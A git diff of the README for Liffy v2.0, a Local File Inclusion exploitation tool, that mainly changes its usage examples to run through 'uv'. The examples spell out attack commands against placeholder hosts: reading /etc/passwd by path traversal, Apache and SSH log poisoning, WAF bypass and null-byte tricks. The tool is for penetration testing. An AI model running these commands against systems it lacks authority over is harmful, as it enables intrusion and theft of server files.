@@ -19,7 +19,7 @@ A powerful Python tool for Local File Inclusion (LFI) exploitation with advanced
 
 Liffy v2.0 is the significantly enhanced version of [liffy](https://github.com/hvqzao/liffy) which was originally created by [rotlogix/liffy](https://github.com/rotlogix/liffy). This version includes modern features like Rich terminal output, YAML configuration, enhanced threading, and multiple advanced exploitation techniques.
 
-Lot of new changes were vibe coded using claude.
+> ⚠️ Lot of new changes were vibe coded.
 
 ## Table of Contents
 
@@ -68,7 +68,7 @@ Lot of new changes were vibe coded using claude.
 
 ## Installation
 
-Make sure you are using **Python 3**. Liffy doesn't support Python 2.
+Make sure you are using **Python 3**. Liffy doesn't support Python 2. The examples below use `uv run python` so commands run inside the project environment.
 
 ```bash
 # Install uv if you haven't already
@@ -81,15 +81,11 @@ cd liffy
 # Create virtual environment with uv
 uv venv
 
-# Activate virtual environment
-source .venv/bin/activate  # On Linux/Mac
-# .venv\Scripts\activate     # On Windows
-
 # Install dependencies
 uv pip install -r requirements.txt
 
 # Run liffy
-uv run python3 liffy.py --help
+uv run python liffy.py --help
 ```
 
 ## Usage
@@ -97,7 +93,7 @@ uv run python3 liffy.py --help
 ### Basic Syntax
 
 ```bash
-python3 liffy.py <URL> [OPTIONS]
+uv run python liffy.py <URL> [OPTIONS]
 ```
 
 ### Command Line Options
@@ -151,7 +147,7 @@ General Options:
 Create a configuration file for persistent settings:
 
 ```bash
-python3 liffy.py --config
+uv run python liffy.py --config
 ```
 
 This creates `liffy_config.yaml` with default settings:
@@ -198,10 +194,10 @@ With `--encoding`, liffy applies advanced encoding methods:
 
 ```bash
 # POST with form data
-python3 liffy.py "http://target.com/lfi.php" -d --method POST --post-data "file=../../etc/passwd"
+uv run python liffy.py "http://target.com/lfi.php" -d --method POST --post-data "file=../../etc/passwd"
 
 # POST with custom headers
-python3 liffy.py "http://target.com/lfi.php" -d --method POST --headers "X-Forwarded-For:127.0.0.1,Authorization:Bearer token123"
+uv run python liffy.py "http://target.com/lfi.php" -d --method POST --headers "X-Forwarded-For:127.0.0.1,Authorization:Bearer token123"
 ```
 
 ## Examples
@@ -211,19 +207,19 @@ python3 liffy.py "http://target.com/lfi.php" -d --method POST --headers "X-Forwa
 #### Test with data:// wrapper
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -d
+uv run python liffy.py "http://example.com/page.php?file=" -d
 ```
 
 #### Test with multiple techniques
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -d -i -e -f
+uv run python liffy.py "http://example.com/page.php?file=" -d -i -e -f
 ```
 
 #### Detection mode only
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" --detection -d -i -e
+uv run python liffy.py "http://example.com/page.php?file=" --detection -d -i -e
 ```
 
 ### Advanced Usage
@@ -231,19 +227,19 @@ python3 liffy.py "http://example.com/page.php?file=" --detection -d -i -e
 #### WAF bypass with encoding
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -d --waf-bypass --encoding
+uv run python liffy.py "http://example.com/page.php?file=" -d --waf-bypass --encoding
 ```
 
 #### Multi-threaded with rate limiting
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -d -t 10 --config
+uv run python liffy.py "http://example.com/page.php?file=" -d -t 10 --config
 ```
 
 #### POST request with custom headers
 
 ```bash
-python3 liffy.py "http://example.com/upload.php" -d --method POST \
+uv run python liffy.py "http://example.com/upload.php" -d --method POST \
   --post-data "action=read&file=../../etc/passwd" \
   --headers "User-Agent:Mozilla/5.0,X-Forwarded-For:192.168.1.1"
 ```
@@ -253,19 +249,19 @@ python3 liffy.py "http://example.com/upload.php" -d --method POST \
 #### Apache access log poisoning
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -a
+uv run python liffy.py "http://example.com/page.php?file=" -a
 ```
 
 #### SSH auth log poisoning
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" --ssh
+uv run python liffy.py "http://example.com/page.php?file=" --ssh
 ```
 
 #### Custom log location
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -a -l "/var/log/apache2/access.log"
+uv run python liffy.py "http://example.com/page.php?file=" -a -l "/var/log/apache2/access.log"
 ```
 
 ### Directory Traversal
@@ -273,13 +269,13 @@ python3 liffy.py "http://example.com/page.php?file=" -a -l "/var/log/apache2/acc
 #### Relative path traversal
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -d -r
+uv run python liffy.py "http://example.com/page.php?file=" -d -r
 ```
 
 #### Directory traversal testing
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -dt
+uv run python liffy.py "http://example.com/page.php?file=" -dt
 ```
 
 ### Special Techniques
@@ -287,19 +283,19 @@ python3 liffy.py "http://example.com/page.php?file=" -dt
 #### Null byte poisoning (legacy PHP)
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" --null-byte
+uv run python liffy.py "http://example.com/page.php?file=" --null-byte
 ```
 
 #### ZIP wrapper exploitation
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" --zip
+uv run python liffy.py "http://example.com/page.php?file=" --zip
 ```
 
 #### Comprehensive scan with all techniques
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" \
+uv run python liffy.py "http://example.com/page.php?file=" \
   -d -i -e -f -p -a --ssh -dt --null-byte --zip \
   --encoding --waf-bypass --detection
 ```
@@ -309,7 +305,7 @@ python3 liffy.py "http://example.com/page.php?file=" \
 #### Using session cookies
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -d \
+uv run python liffy.py "http://example.com/page.php?file=" -d \
   --cookies "PHPSESSID=abc123; auth_token=xyz789"
 ```
 
@@ -318,7 +314,7 @@ python3 liffy.py "http://example.com/page.php?file=" -d \
 #### Disable colors and banner
 
 ```bash
-python3 liffy.py "http://example.com/page.php?file=" -d --no-color --no-banner
+uv run python liffy.py "http://example.com/page.php?file=" -d --no-color --no-banner
 ```
 
 ## Default File Locations
@@ -394,10 +390,10 @@ Liffy's detection mode provides comprehensive vulnerability analysis:
 
 ```bash
 # Use WAF bypass techniques
-python3 liffy.py "http://target.com/lfi.php" -d --waf-bypass
+uv run python liffy.py "http://target.com/lfi.php" -d --waf-bypass
 
 # Reduce thread count and increase delays
-python3 liffy.py "http://target.com/lfi.php" -d -t 1
+uv run python liffy.py "http://target.com/lfi.php" -d -t 1
 ```
 
 #### Rate Limiting Issues
